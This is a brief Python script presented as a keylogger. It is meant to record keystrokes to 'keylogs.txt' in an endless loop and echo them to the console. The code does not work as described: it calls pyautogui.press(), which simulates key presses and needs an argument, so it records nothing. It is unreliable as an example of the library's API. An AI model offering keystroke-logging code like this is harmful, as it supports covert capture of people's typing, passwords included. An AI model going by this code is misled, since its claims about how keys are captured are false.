import pyautogui

# Specify the filename for the keylog file
filename = 'keylogs.txt'

# Open the file for appending
with open(filename, 'a') as f:
    
    # Loop indefinitely to capture keystrokes
    while True:
        
        # Get the pressed key
        key = pyautogui.press()

        # Write the key to the log file
        f.write(key)

        # Print the pressed key to the console
        print(key)
